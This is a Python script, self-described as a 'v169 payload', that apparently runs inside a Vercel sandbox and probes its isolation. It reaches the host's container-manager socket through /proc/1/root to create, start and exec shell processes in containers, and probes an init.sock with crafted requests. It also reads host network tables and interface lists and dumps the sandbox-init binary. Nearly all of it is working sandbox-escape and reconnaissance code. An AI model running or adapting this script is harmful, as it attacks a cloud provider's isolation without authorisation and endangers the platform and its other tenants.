# -*- coding: utf-8 -*-
"""v169 payload: Exec 调试 (cgroup.procs 验证) + init.sock 探测 + celld 网络视角
输出 /vercel/sandbox/v169c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v169c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def probe_unix(sockpath, payload=b'', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if payload:
            s.sendall(payload)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d[:3000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__


def exec_json(cid, cmd_str, tag, t=8):
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh', 'arguments': ['-c', cmd_str]}}).encode()
    st, pay = raw_req(CELL, '%s/Exec' % CTRS, body, t=t)
    log('%s Exec -> %s %r' % (tag, st, pay[:250]))
    return st, pay


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: Create yes + Start ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
yes_pid = None
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:200]))
    time.sleep(1)
    f = find_proc(['yes'])
    if f:
        yes_pid = f[0]
        log('yes pid=%s' % yes_pid)

    # ============ 2: Exec 调试 ============
    log('=== 2 exec debug ===')
    # cgroup.procs 基线
    cgp = '/sys/fs/cgroup/container/%s/cgroup.procs' % cid
    try:
        log('cgroup.procs before: %r' % open(cgp).read())
    except Exception as e:
        log('cg EXC %s' % e)
    # Exec 变体 1: 标准
    exec_json(cid, 'sleep 120', 'A')
    time.sleep(0.5)
    try:
        log('cgroup.procs after A: %r' % open(cgp).read())
    except Exception as e:
        log('cg2 EXC %s' % e)
    # Exec 变体 2: 无 arguments
    body = json.dumps({'container_id': cid, 'process': {'command': '/bin/sleep'}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=6)
    log('B Exec(nocmd args) -> %s %r' % (st3, pay3[:200]))
    time.sleep(0.5)
    try:
        log('cgroup.procs after B: %r' % open(cgp).read())
    except Exception as e:
        log('cg3 EXC %s' % e)
    # Exec 变体 3: command 用完整路径带参数? (string)
    body = json.dumps({'container_id': cid, 'process': {'command': '/bin/sh -c sleep 120'}}).encode()
    st4, pay4 = raw_req(CELL, '%s/Exec' % CTRS, body, t=6)
    log('C Exec(cmdstr) -> %s %r' % (st4, pay4[:200]))
    time.sleep(0.5)
    try:
        log('cgroup.procs after C: %r' % open(cgp).read())
    except Exception as e:
        log('cg4 EXC %s' % e)
    # 容器 pid ns 视角进程
    if yes_pid:
        try:
            pl = sorted(os.listdir('/proc/%s/root/proc' % yes_pid))
            nums = [x for x in pl if x.isdigit()]
            log('ctr pidns procs: %s' % nums[:30])
        except Exception as e:
            log('ctrproc EXC %s' % e)
    # host 全进程找新 sleep
    time.sleep(1)
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in ('sleep', 'sh'):
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:80].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                log('hostproc %s %s %s' % (d, comm, cl))

# ============ 3: init.sock 探测 (volumes 路径) ============
log('=== 3 init.sock ===')
sp = '/proc/1/root/volumes/run/vercel/share/init.sock'
r = probe_unix(sp, b'GET / HTTP/1.1\r\nHost: unix\r\nConnection: close\r\n\r\n', t=3)
log('HTTP %s -> %r' % (sp, r[:500]))
r = probe_unix(sp, b'{"jsonrpc":"2.0","method":"ping","id":1}\n', t=2)
log('JSON %s -> %r' % (sp, r[:300]))
r = probe_unix(sp, b'', t=2)
log('RAW %s -> %r' % (sp, r[:300]))

# ============ 4: celld 网络视角 ============
log('=== 4 celld net ===')
for p in ['/proc/1/net/tcp', '/proc/1/net/tcp6', '/proc/1/net/udp', '/proc/1/net/route',
          '/proc/1/net/vsock', '/proc/1/net/unix']:
    try:
        d = open(p).read()[:1500]
        log('CELD %s: %s' % (p, d[:1300]))
    except Exception as e:
        log('CELD %s EXC %s' % (p, e))
try:
    log('IFACE: %s' % os.listdir('/proc/1/root/sys/class/net'))
except Exception as e:
    log('IFACE EXC %s' % e)

# ============ 5: sandbox-init 二进制 ============
log('=== 5 sbi bin ===')
try:
    d = open('/proc/1/root/volumes/run/vercel/share/sandbox-init', 'rb').read()
    log('sandbox-init size=%d head=%r' % (len(d), d[:200]))
except Exception as e:
    log('sbi EXC %s' % e)

log('V169_DONE')
f.close()
